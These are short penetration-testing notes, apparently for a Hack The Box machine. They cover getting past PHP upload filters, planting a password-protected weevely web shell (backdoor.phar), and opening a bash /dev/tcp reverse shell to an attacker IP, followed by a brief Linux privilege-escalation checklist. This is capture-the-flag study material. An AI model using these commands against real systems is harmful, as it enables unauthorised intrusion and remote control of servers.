

## PHP WEB SHELLS
When a website is using php and you can upload lets say a pdf a good way to see if you can upload a php file is to filter the extensions uploaded just file the end of the filename extension for common ones with 

https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%
20Insecure%20Files/Extension%20PHP/extensions.lst


use intruder for this in burpsuite


if you can upload it now you need to find the uploads content you can use SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt to filter fuzz for the uploads directory

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


if you can upload and go to a php web shell but it is failing maybe try to invoke The phpinfo() output provides us with a list of all disabled functions, which includes most code
execution functions. 

to bypass filters we can use https://github.com/epinna/weevely3 which is on kali. 

use it like 
1. Generate shell
```
weevely generate 'p4wn4g386!' backdoor.phar
```

2. upload the shell

3. Invoke the shell
```
weevely http://hospital.htb:8080/uploads/backdoor.phar 'p4wn4g386!'
```

4. Migrate to Netcat with by first setting up a listener on your attacking host

5. invoke rev shell to your host 
bash -c 'bash -i >& /dev/tcp/10.10.14.14/4444 0>&1' 






## PrivEsc Linux

check the kernel version always remember to do this 

```
uname -a
```


Run Linpeas. 

Check for chmod scripts 

check for env credentials (especially in docker or other containers)

